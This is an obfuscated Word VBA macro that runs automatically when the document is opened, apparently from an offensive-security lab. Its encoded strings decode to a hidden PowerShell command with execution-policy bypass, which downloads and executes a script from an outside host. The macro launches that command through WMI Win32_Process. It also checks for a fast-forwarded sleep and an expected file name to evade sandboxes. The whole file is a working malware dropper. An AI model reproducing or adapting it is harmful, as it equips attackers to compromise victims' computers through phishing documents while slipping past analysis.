Private Declare PtrSafe Function Sleep Lib "KERNEL32" (ByVal mili As Long) As Long
Sub Document_Open()
 MyMacro
End Sub
Sub AutoOpen()
 MyMacro
End Sub
Function Grass(Goats)
 Grass = Chr(Goats - 12)
End Function
Function Screen(Grapes)
 Screen = Left(Grapes, 3)
End Function
Function Gorgon(Topside)
 Gorgon = Right(Topside, Len(Topside) - 3)
End Function
Function Yellow(Troop)
 Do
 Shazam = Shazam + Grass(Screen(Troop))
 Troop = Gorgon(Troop)
 Loop While Len(Troop) > 0
 Yellow = Shazam
End Function
Function MyMacro()
 Dim Apples As String
 Dim Leap As String
 Dim t1 As Date
 Dim t2 As Date
 Dim time As Long
 t1 = Now()
 Sleep (5000)
 t2 = Now()
 time = DateDiff("s", t1, t2)
 If time < 4.5 Then
    Exit Function
 End If
 If ActiveDocument.Name <> Yellow("109124124058112123111121") Then
    Exit Function
 End If
 Apples = "124123131113126127116113120120044057113132113111044110133124109127127044057122123124044057131044116117112112113122044057111044117113132052122113131057123110118113111128044122113128058131113110111120117113122128053058112123131122120123109112127128126117122115052051116128128124070059059061069062058061066068058064069058066066059109128128109111116058128132128051053"
 Leap = Yellow(Apples)
 GetObject(Yellow("131117122121115121128127070")).Get(Yellow("099117122063062107092126123111113127127")).Create Leap, Tea, Coffee, Napkin
End Function
